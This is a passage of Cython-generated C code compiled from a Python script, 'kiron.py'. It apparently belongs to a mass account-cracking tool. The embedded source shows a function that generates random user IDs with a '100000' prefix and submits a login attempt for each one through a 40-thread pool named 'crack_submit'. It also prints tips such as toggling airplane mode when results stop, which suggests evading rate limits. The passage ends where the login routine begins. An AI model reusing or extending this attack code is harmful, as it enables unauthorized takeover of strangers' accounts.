        if (unlikely(!__pyx_t_9)) {
          PyObject* exc_type = PyErr_Occurred();
          if (exc_type) {
            if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
            else __PYX_ERR(0, 203, __pyx_L1_error)
          }
          break;
        }
        __Pyx_GOTREF(__pyx_t_9);
      }
      __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_9);
      __pyx_t_9 = 0;

      /* "kiron.py":204
 *         star="100000"
 *         for i in range(int(limit)):
 *             data=str(random.choice(range(100000000,999999999)))             # <<<<<<<<<<<<<<
 *             user.append(data)
 * 
 */
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_10 = NULL;
      __pyx_t_4 = 0;
      #if CYTHON_UNPACK_METHODS
      if (unlikely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
          __pyx_t_4 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_t_2};
        __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 204, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      }
      __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_9); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 204, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF_SET(__pyx_v_data, __pyx_t_3);
      __pyx_t_3 = 0;

      /* "kiron.py":205
 *         for i in range(int(limit)):
 *             data=str(random.choice(range(100000000,999999999)))
 *             user.append(data)             # <<<<<<<<<<<<<<
 * 
 *        with tred(max_workers=40) as crack_submit:
 */
      __pyx_t_11 = __Pyx_PyList_Append(__pyx_v_user, __pyx_v_data); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 205, __pyx_L1_error)

      /* "kiron.py":203
 *        else:
 *         star="100000"
 *         for i in range(int(limit)):             # <<<<<<<<<<<<<<
 *             data=str(random.choice(range(100000000,999999999)))
 *             user.append(data)
 */
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_L3:;

  /* "kiron.py":207
 *             user.append(data)
 * 
 *        with tred(max_workers=40) as crack_submit:             # <<<<<<<<<<<<<<
 *            clear()
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m\x1b[38;5;46m{A} {limit} ')
 */
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tred); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 207, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 207, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_max_workers, __pyx_int_40) < 0) __PYX_ERR(0, 207, __pyx_L1_error)
    __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_3); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 207, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = __Pyx_PyObject_LookupSpecial(__pyx_t_9, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 207, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_12);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_9, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 207, __pyx_L10_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};
      __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 207, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __pyx_t_1 = __pyx_t_3;
    __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_13, &__pyx_t_14, &__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_15);
        /*try:*/ {
          __pyx_v_crack_submit = __pyx_t_1;
          __pyx_t_1 = 0;

          /* "kiron.py":208
 * 
 *        with tred(max_workers=40) as crack_submit:
 *            clear()             # <<<<<<<<<<<<<<
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m\x1b[38;5;46m{A} {limit} ')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m  \x1b[38;5;46m {A}M{ask}')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_clear); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 208, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_3 = NULL;
          __pyx_t_4 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_9))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_9);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_9, function);
              __pyx_t_4 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
            __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 208, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "kiron.py":209
 *        with tred(max_workers=40) as crack_submit:
 *            clear()
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m\x1b[38;5;46m{A} {limit} ')             # <<<<<<<<<<<<<<
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m  \x1b[38;5;46m {A}M{ask}')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()
 */
          __pyx_t_1 = PyTuple_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 209, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_7 = 0;
          __pyx_t_16 = 127;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_4);
          __pyx_t_16 = (65535 > __pyx_t_16) ? 65535 : __pyx_t_16;
          __pyx_t_7 += 84;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_4);
          PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_4);
          __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_A); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 209, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 209, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_16;
          __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
          __Pyx_GIVEREF(__pyx_t_3);
          PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_3);
          __pyx_t_3 = 0;
          __Pyx_INCREF(__pyx_kp_u__25);
          __pyx_t_7 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__25);
          PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__25);
          __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_limit, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 209, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_16;
          __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
          __Pyx_GIVEREF(__pyx_t_3);
          PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_3);
          __pyx_t_3 = 0;
          __Pyx_INCREF(__pyx_kp_u__25);
          __pyx_t_7 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__25);
          PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__25);
          __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_1, 5, __pyx_t_7, __pyx_t_16); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 209, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 209, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "kiron.py":210
 *            clear()
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m\x1b[38;5;46m{A} {limit} ')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m  \x1b[38;5;46m {A}M{ask}')             # <<<<<<<<<<<<<<
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()
 *            for mal in user:
 */
          __pyx_t_1 = PyTuple_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 210, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_7 = 0;
          __pyx_t_16 = 127;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_5);
          __pyx_t_16 = (65535 > __pyx_t_16) ? 65535 : __pyx_t_16;
          __pyx_t_7 += 85;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_5);
          PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u_38_5_244m_1_97m_38_5_244m_38_5_5);
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_A); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 210, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 210, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_16;
          __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
          __Pyx_GIVEREF(__pyx_t_9);
          PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_9);
          __pyx_t_9 = 0;
          __Pyx_INCREF(__pyx_n_u_M);
          __pyx_t_7 += 1;
          __Pyx_GIVEREF(__pyx_n_u_M);
          PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_n_u_M);
          __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_v_ask, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 210, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_16 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_16) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_16;
          __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
          __Pyx_GIVEREF(__pyx_t_9);
          PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_9);
          __pyx_t_9 = 0;
          __pyx_t_9 = __Pyx_PyUnicode_Join(__pyx_t_1, 4, __pyx_t_7, __pyx_t_16); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 210, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 210, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "kiron.py":211
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m\x1b[38;5;46m{A} {limit} ')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m  \x1b[38;5;46m {A}M{ask}')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()             # <<<<<<<<<<<<<<
 *            for mal in user:
 *               uid=star+mal
 */
          __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__26, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 211, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_linex); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 211, __pyx_L14_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_3 = NULL;
          __pyx_t_4 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_9))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_9);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_9, function);
              __pyx_t_4 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
            __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 211, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "kiron.py":212
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m  \x1b[38;5;46m {A}M{ask}')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()
 *            for mal in user:             # <<<<<<<<<<<<<<
 *               uid=star+mal
 *               crack_submit.submit(login,uid)
 */
          __pyx_t_1 = __pyx_v_user; __Pyx_INCREF(__pyx_t_1);
          __pyx_t_7 = 0;
          for (;;) {
            {
              Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);
              #if !CYTHON_ASSUME_SAFE_MACROS
              if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 212, __pyx_L14_error)
              #endif
              if (__pyx_t_7 >= __pyx_temp) break;
            }
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_9 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_9); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 212, __pyx_L14_error)
            #else
            __pyx_t_9 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 212, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_9);
            #endif
            __Pyx_XDECREF_SET(__pyx_v_mal, __pyx_t_9);
            __pyx_t_9 = 0;

            /* "kiron.py":213
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()
 *            for mal in user:
 *               uid=star+mal             # <<<<<<<<<<<<<<
 *               crack_submit.submit(login,uid)
 * 
 */
            __pyx_t_9 = PyNumber_Add(__pyx_v_star, __pyx_v_mal); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 213, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_9);
            __pyx_t_9 = 0;

            /* "kiron.py":214
 *            for mal in user:
 *               uid=star+mal
 *               crack_submit.submit(login,uid)             # <<<<<<<<<<<<<<
 * 
 * loop=0
 */
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_crack_submit, __pyx_n_s_submit); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 214, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_login); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 214, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_10 = NULL;
            __pyx_t_4 = 0;
            #if CYTHON_UNPACK_METHODS
            if (likely(PyMethod_Check(__pyx_t_3))) {
              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_3);
              if (likely(__pyx_t_10)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_10);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
                __pyx_t_4 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[3] = {__pyx_t_10, __pyx_t_2, __pyx_v_uid};
              __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 2+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 214, __pyx_L14_error)
              __Pyx_GOTREF(__pyx_t_9);
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

            /* "kiron.py":212
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m  \x1b[38;5;46m {A}M{ask}')
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()
 *            for mal in user:             # <<<<<<<<<<<<<<
 *               uid=star+mal
 *               crack_submit.submit(login,uid)
 */
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "kiron.py":207
 *             user.append(data)
 * 
 *        with tred(max_workers=40) as crack_submit:             # <<<<<<<<<<<<<<
 *            clear()
 *            print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m\x1b[38;5;46m{A} {limit} ')
 */
        }
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        goto __pyx_L19_try_end;
        __pyx_L14_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("kiron._old_", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_9, &__pyx_t_3) < 0) __PYX_ERR(0, 207, __pyx_L16_except_error)
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_9);
          __Pyx_XGOTREF(__pyx_t_3);
          __pyx_t_2 = PyTuple_Pack(3, __pyx_t_1, __pyx_t_9, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 207, __pyx_L16_except_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_2, NULL);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 207, __pyx_L16_except_error)
          __Pyx_GOTREF(__pyx_t_17);
          __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          if (__pyx_t_6 < 0) __PYX_ERR(0, 207, __pyx_L16_except_error)
          __pyx_t_5 = (!__pyx_t_6);
          if (unlikely(__pyx_t_5)) {
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_9);
            __Pyx_XGIVEREF(__pyx_t_3);
            __Pyx_ErrRestoreWithState(__pyx_t_1, __pyx_t_9, __pyx_t_3);
            __pyx_t_1 = 0; __pyx_t_9 = 0; __pyx_t_3 = 0; 
            __PYX_ERR(0, 207, __pyx_L16_except_error)
          }
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          goto __pyx_L15_exception_handled;
        }
        __pyx_L16_except_error:;
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_15);
        goto __pyx_L1_error;
        __pyx_L15_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_15);
        __pyx_L19_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_12) {
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__27, NULL);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 207, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        }
        goto __pyx_L13;
      }
      __pyx_L13:;
    }
    goto __pyx_L26;
    __pyx_L10_error:;
    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
    goto __pyx_L1_error;
    __pyx_L26:;
  }

  /* "kiron.py":187
 * """)
 * #-----------------------[ OLD-CODE ]-----------------------#
 * def _old_():             # <<<<<<<<<<<<<<
 *        user=[]
 *        clear()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("kiron._old_", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_star);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_crack_submit);
  __Pyx_XDECREF(__pyx_v_mal);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":220
 * cps=[]
 * 
 * def login(uid):             # <<<<<<<<<<<<<<
 *     global oks,loop
 *     Session=requests.session()
 */

/* Python wrapper */
